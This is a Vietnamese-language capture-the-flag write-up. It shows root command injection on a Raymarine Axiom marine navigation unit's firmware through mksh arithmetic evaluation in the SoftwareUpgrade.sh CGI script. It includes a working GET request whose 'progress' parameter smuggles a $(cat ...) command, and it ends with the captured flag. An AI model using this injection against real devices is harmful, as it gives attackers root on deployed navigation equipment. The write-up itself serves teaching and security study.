# Writeup: Raymarine navigation (boot2root)

## 1. Tổng quan & Hướng tư duy tiếp cận
- **Mục tiêu**: Khai thác thiết bị điều hướng hàng hải Raymarine Axiom MFD (chạy firmware thực tế tháng 7/2026) để đọc nội dung `/root/flag.txt`.
- **Đặc trưng tác giả**: Thử thách do tác giả `hoover` tạo (tương tự như chuỗi bài `Clean Sweep` và `Omniscient`). Điểm chung của dòng bài này là mô phỏng/chạy trực tiếp các firmware nhúng và web service CGI thực tế của thiết bị IoT.
- **Tư duy cốt lõi**:
  1. Thay vì chỉ fuzzing mù từ bên ngoài mạng, tải trực tiếp firmware chính hãng của dòng Raymarine Axiom MFD (`raymarine-4.11.133.img`) và trích xuất phân vùng `system.img` (SquashFS).
  2. Phân tích cấu hình khởi động của thiết bị tại `/system/bin/raymarine.init.sh` để xác định chính xác kiến trúc web server, các thư mục tĩnh và các kịch bản CGI được liên kết (symlink) vào `httproot`.
  3. Đánh giá luồng xử lý đầu vào của các CGI script xem có tồn tại lỗ hổng injection trong shell interpreter hay không.

---

## 2. Phân tích kiến trúc dịch vụ & Điểm yếu bảo mật

### Cấu trúc Web Server & CGI Dispatching
Trong file khởi động `raymarine.init.sh`:
- Web server được khởi chạy bằng `busybox httpd -p8080 -h/mnt/tmp/httproot`.
- Thư mục document root `/mnt/tmp/httproot` có cấu trúc:
  - `/mnt/tmp/httproot/cgi-bin`: chứa các symlink tới binary/script trong `/system/bin`.
  - `/mnt/tmp/httproot/SharedFiles`: quyền ghi `777`, được serve tĩnh công khai tại URL `/SharedFiles/`.
  - `/mnt/tmp/httproot/SWUpgrades`: quyền ghi `777`.
  - Hai CGI handler chính:
    - `/cgi-bin/com.raymarine` (ELF binary ARM, kiểm tra chữ ký số RSA của gói nâng cấp).
    - `/cgi-bin/SoftwareUpgrade.sh` (Shell script thực thi bởi `/system/bin/sh`).

### Lỗ hổng Command Injection qua Arithmetic Evaluation trong `mksh`
Kiểm tra binary `/system/bin/sh` của Android/firmware cho thấy đây là **MirBSD Korn Shell (`mksh` R50)**.

Xem xét logic xử lý tham số trong `/system/bin/raymarine.cgi-bin.SoftwareUpgrade.sh`:
1. Hàm `parse_query()` lấy giá trị tham số `progress` từ `$QUERY_STRING` và thực hiện thay thế `%20` thành khoảng trắng bằng `sed`.
2. Script kiểm tra kích thước file thông qua biểu thức điều kiện:
   ```bash
   if [[ $fileSize -le $progress ]]
   ```
3. **Cơ chế đánh giá biểu thức số học của `mksh`**:
   - Trong `mksh`, cú pháp so sánh số học `[[ A -le B ]]` sẽ chuyển toán hạng thứ hai vào bộ phân tích cú pháp biểu thức số học (`arithmetic parser`).
   - Khi bộ phân tích số học của `mksh` gặp cú pháp truy cập mảng `array[...]`, nội dung bên trong dấu ngoặc vuông `[...]` được đánh giá đệ quy.
   - Nếu bên trong chỉ số mảng có chứa toán tử thực thi lệnh `$(command)`, shell sẽ kích hoạt `subshell substitution` ngay lập tức với quyền hạn của tiến trình web server (quyền `root`).

---

## 3. Luồng tấn công (Attack Flow)

1. **Chuẩn bị Payload**:
   - Lợi dụng việc thư mục `/mnt/tmp/httproot/SharedFiles` có quyền `777` và được phục vụ trực tiếp qua HTTP GET tại `/SharedFiles/`.
   - Tạo payload thực thi lệnh copy `/root/flag.txt` sang `/mnt/tmp/httproot/SharedFiles/flag.txt`:
     ```bash
     cat /root/flag.txt>/mnt/tmp/httproot/SharedFiles/flag.txt
     ```
   - Chuyển khoảng trắng thành `%20` để khớp với bộ parse query của script:
     ```
     cat%20/root/flag.txt>/mnt/tmp/httproot/SharedFiles/flag.txt
     ```
   - Đóng gói vào biểu thức số học mảng `mksh`:
     ```
     progress=x[$(cat%20/root/flag.txt>/mnt/tmp/httproot/SharedFiles/flag.txt)0]
     ```

2. **Kích hoạt khai thác qua CGI**:
   - Gửi yêu cầu HTTP GET tới endpoint:
     ```
     GET /cgi-bin/SoftwareUpgrade.sh?ipaddress=1&package=1&progress=x[$(cat%20/root/flag.txt>/mnt/tmp/httproot/SharedFiles/flag.txt)0]
     ```
   - `mksh` kích hoạt subshell, ghi nội dung cờ vào thư mục tĩnh.

3. **Thu thập Flag**:
   - Gửi yêu cầu HTTP GET tới `/SharedFiles/flag.txt` để lấy cờ trực tiếp từ web server.

---

## 4. Flag
```
NNS{oNCe_i_se3_cgi_bin5_1_53e_3a5Y_rc3_Wi7H_c0MM4ND_1nj3C71ons}
```
